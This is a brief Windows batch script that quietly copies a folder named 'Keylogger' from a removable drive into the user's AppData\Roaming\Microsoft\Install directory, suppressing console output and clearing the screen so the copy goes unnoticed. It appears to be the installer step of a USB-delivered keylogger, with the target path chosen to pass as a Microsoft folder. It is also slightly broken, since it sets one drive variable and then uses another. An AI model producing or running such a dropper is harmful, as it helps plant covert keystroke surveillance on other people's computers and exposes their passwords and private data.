@echo off
:: variables
SET odrive=%odrive:~0,2%
set backupcmd=xcopy /c
echo off
%backupcmd% "%drive%\Keylogger" "%USERPROFILE%\AppData\Roaming\Microsoft\Install"
@echo off
cls